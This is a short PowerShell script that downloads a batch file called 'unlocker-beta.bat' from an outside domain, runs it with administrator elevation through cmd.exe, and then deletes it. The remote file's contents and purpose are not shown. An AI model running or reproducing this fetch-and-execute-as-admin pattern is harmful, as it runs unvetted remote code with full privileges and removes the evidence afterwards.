$temp = Join-Path $env:TEMP ("myscript_" + [guid]::NewGuid() + ".bat")

# Download properly
Invoke-WebRequest "https://cdn.rueben.xyz/content/unlockercli/app/unlocker-beta.bat" -OutFile $temp

# Run it
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$temp`"" -Verb RunAs -Wait

# Clean up
Remove-Item $temp -Force